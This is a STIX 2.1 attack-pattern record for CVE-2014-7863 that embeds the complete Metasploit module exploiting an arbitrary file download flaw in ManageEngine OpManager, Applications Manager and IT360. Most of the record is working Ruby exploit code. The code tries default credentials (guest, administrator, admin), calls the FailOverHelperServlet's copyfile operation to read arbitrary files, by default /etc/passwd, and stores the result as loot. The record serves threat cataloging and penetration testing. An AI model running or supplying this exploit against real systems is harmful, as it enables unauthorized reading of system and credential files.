{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c19e5aa9-01a2-43af-9ccc-5155743259c9",
    "created": "2024-08-14T16:23:39.970802Z",
    "modified": "2024-08-14T16:23:39.970807Z",
    "name": "ManageEngine Multiple Products Arbitrary File Download",
    "description": " This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This module will attempt to login using the default credentials for the administrator and guest accounts; alternatively you can provide a pre-authenticated cookie or a username and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually 8300). This module has been tested on both Windows and Linux with several different versions. Windows paths have to be escaped with 4 backslashes on the command line. There is a companion module that allows the recursive listing of any directory. This vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/manageengine_file_download.rb",
            "external_id": "manageengine_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7863"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jan/114"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine Multiple Products Arbitrary File Download',\n        'Description' => %q{\n          This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet\n          on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is\n          unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This\n          module will attempt to login using the default credentials for the administrator and\n          guest accounts; alternatively you can provide a pre-authenticated cookie or a username\n          and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually\n          8300). This module has been tested on both Windows and Linux with several different\n          versions. Windows paths have to be escaped with 4 backslashes on the command line. There is\n          a companion module that allows the recursive listing of any directory. This\n          vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2014-7863'],\n          ['OSVDB', '117695'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/114'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt']\n        ],\n        'DisclosureDate' => '2015-01-28'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The base path to OpManager, AppManager or IT360', '/']),\n        OptString.new('FILEPATH', [true, 'Path of the file to download', '/etc/passwd']),\n        OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),\n        OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),\n        OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),\n        OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def get_cookie\n    cookie = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n\n    if res\n      cookie = res.get_cookies\n    end\n\n    cookie\n  end\n\n  def detect_it360\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      return true\n    end\n\n    return false\n  end\n\n  def get_it360_cookie_name\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n\n    cookie = res.get_cookies\n\n    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      return ::Regexp.last_match(1)\n    else\n      return nil\n    end\n  end\n\n  def authenticate_it360(port, path, username, password)\n    if datastore['DOMAIN_NAME'].nil?\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'false'\n      }\n    else\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'true',\n        'domainName' => datastore['DOMAIN_NAME']\n      }\n    end\n\n    res = send_request_cgi({\n      'rport' => port,\n      'method' => 'POST',\n      'uri' => normalize_uri(path),\n      'vars_get' => {\n        'service' => 'OpManager',\n        'furl' => '/',\n        'timestamp' => Time.now.to_i\n      },\n      'vars_post' => vars_post\n    })\n\n    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=(\\w{9,})/\n      # /IAMAGENTTICKET([A-Z]{0,4})=([\\w]{9,})/ -> this pattern is to avoid matching \"removed\"\n      return res.get_cookies\n    end\n\n    nil\n  end\n\n  def login_it360\n    # Do we already have a valid cookie? If yes, just return that.\n    unless datastore['IAMAGENTTICKET'].nil?\n      cookie_name = get_it360_cookie_name\n      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'\n      return cookie\n    end\n\n    # get the correct path, host and port\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n\n    if res && res.redirect?\n      uri = [ res.redirection.port, res.redirection.path ]\n    else\n      return nil\n    end\n\n    if datastore['USERNAME'] && datastore['PASSWORD']\n      print_status(\"Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...\")\n      cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])\n      unless cookie.nil?\n        return cookie\n      end\n    end\n\n    default_users = ['guest', 'administrator', 'admin']\n\n    default_users.each do |user|\n      print_status(\"Trying to authenticate as #{user}...\")\n      cookie = authenticate_it360(uri[0], uri[1], user, user)\n      unless cookie.nil?\n        return cookie\n      end\n    end\n\n    nil\n  end\n\n  def run\n    # No point to continue if filepath is not specified\n    if datastore['FILEPATH'].empty?\n      print_error('Please supply the path of the file you want to download.')\n      return\n    end\n\n    if detect_it360\n      print_status('Detected IT360, attempting to login...')\n      cookie = login_it360\n      if cookie.nil?\n        print_error('Failed to login to IT360!')\n        return\n      end\n    else\n      cookie = get_cookie\n    end\n\n    servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet'\n    res = send_request_cgi({\n      'method' => 'GET',\n      'cookie' => cookie,\n      'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet)\n    })\n    if res && res.code == 404\n      servlet = 'FailOverHelperServlet'\n    end\n\n    # Create request\n    begin\n      print_status(\"Downloading file #{datastore['FILEPATH']}\")\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => cookie,\n        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),\n        'vars_get' => {\n          'operation' => 'copyfile',\n          'fileName' => datastore['FILEPATH']\n        }\n      })\n    rescue Rex::ConnectionRefused\n      print_error('Could not connect.')\n      return\n    end\n\n    # Show data if needed\n    if res && res.code == 200\n\n      if res.body.to_s.bytesize == 0\n        print_error('0 bytes returned, file does not exist or is empty.')\n        return\n      end\n\n      vprint_line(res.body.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'manageengine.http',\n        'application/octet-stream',\n        datastore['RHOST'],\n        res.body,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error('Failed to download file.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-28"
}